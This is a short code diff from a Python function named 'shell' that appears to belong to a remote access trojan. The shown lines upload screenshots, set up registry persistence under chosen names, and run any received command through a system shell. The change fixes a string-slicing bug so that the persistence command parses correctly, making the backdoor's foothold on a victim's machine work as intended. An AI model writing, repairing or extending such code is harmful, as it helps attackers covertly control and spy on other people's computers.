@@ -75,7 +75,7 @@ def shell():
             upload_file('screen.png')
             os.remove('screen.png')
         elif command[:11] == 'persistence':
-            reg_name, copy_name = command[:12].split(' ')
+            reg_name, copy_name = command[12:].split(' ')
             persist(reg_name,  copy_name)
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
